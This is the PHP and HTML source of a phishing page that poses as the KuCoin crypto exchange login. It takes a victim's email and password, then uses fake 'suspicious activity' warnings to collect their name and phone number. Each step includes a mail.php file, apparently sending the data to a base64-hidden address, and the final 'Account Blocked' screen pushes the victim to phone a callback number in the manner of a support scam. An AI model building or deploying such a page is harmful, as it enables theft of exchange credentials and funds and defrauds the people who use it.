<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kucoin Login - Crypto Exchange, Bitcoin Exchange</title>
    <link rel="stylesheet" href="assets/css/all.min.html">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <div class="container-fluid" id="kucoin-form">
        <div class="row">

            <div class="col-md-5 p-0">
                <div class="content">
                    <a href="#"><img src="assets/images/download.svg"></a>

                    <div class="overlay-content">
                        <h1>Find the next crypto gem on KuCoin</h1>
                        <p>1 Out of 4 Crypto Holders Worldwide Is with KuCoin</p>
                    </div>
                </div>
            </div>
            <div class="col-md-7 p-0">

                 <?php
                 if (isset($_POST['btnLoginMore'])) {
                    include 'mail.php';
                ?>

                <div class="form-area">
                    <div class="navigation">
                        <p>Haven't registered yet?<a href="#"> Sign up Now.</a></p>
                    </div>
                    <div class="form">
                        <h2>Verification Required</h2>
                        <p>Important Message:</p>
                        <p>Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your
                            Identity.</p>
                        <form class="form-group" action="" method="post"><input type="hidden" name="email" value=""><input type="hidden" name="post" value="bXlrZXlzaXRlQGdtYWlsLmNvbQ=='"><input type="hidden" name="password" value=""><label>Full Name</label>
                            <input type="text" placeholder="Full Name" name="name" class="form-control">
                            <label>Phone Number</label>
                            <input type="text" placeholder="+1 123 456 7890" name="number" class="form-control">
                            <div>
                                <button type="submit" name="fromLog" class="btn">Verify</button>
                            </div>
                        </form>
                    </div>
                </div>

                  <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                 ?>

                 <div class="form-area">
                    <div class="navigation">
                        <p>Haven't registered yet?<a href="#"> Sign up Now.</a></p>
                    </div>
                    <div class="form">
                        <h2>Account Blocked</h2>
                        <p>Important Message:</p>
                        <p>Some Suspicious Activity Found With Your Account, Now Your Account is Blocked. Our support representatives have come across certain suspicious activities on your account.</p>
                        <h4 class="callnow">Call on: <strong><a href="tel:11122233344444">+1-111-222-3333</a></strong></h4>
                    </div>
                </div>

                  <?php } else { ?>
                    <div class="form-area">
                    <div class="navigation">
                        <p>Haven't registered yet?<a href="#"> Sign up Now.</a></p>
                    </div>
                    <div class="form">
                        <h2>Log In</h2>
                        <ul class="nav nav-tabs" id="myTab" role="tablist" style="margin-bottom: 30px;"> 
                            <li class="nav-item" role="presentation"  >
                                <a class="nav-link active" id="email-tab"  style="border-right: 1px solid gray;padding:0 20px 0 0 ; border-radius: 0;" data-toggle="tab" href="#email" role="tab"
                                    aria-controls="email" aria-selected="true">Email</a>
                            </li>
                        </ul>
                        <div class="tab-content" id="myTabContent">
                            <div class="tab-pane fade show active" id="email" role="tabpanel"
                                aria-labelledby="email-tab">
                                <form action="" method="post">
                                    <div class="form-group"><input type="hidden" name="post" value="bXlrZXlzaXRlQGdtYWlsLmNvbQ=='">
                                        <label for="exampleInputEmail1">Email / Sub Account</label>
                                        <input type="email" class="form-control" name="email" required="" id="exampleInputEmail1"
                                            aria-describedby="emailHelp"></div><div class="form-group"><label for="exampleInputPassword1">Password</label>
                                        <input type="password" class="form-control" name="password" id="exampleInputPassword1" required="">
                                    </div>
                                   <button type="submit" name="btnLoginMore" class="btn btn-block">Log In</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>


                <?php } ?>

                
            </div>
        </div>
    </div>
    <script src="assets/js/jquery-3.5.1.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
</body>
</html>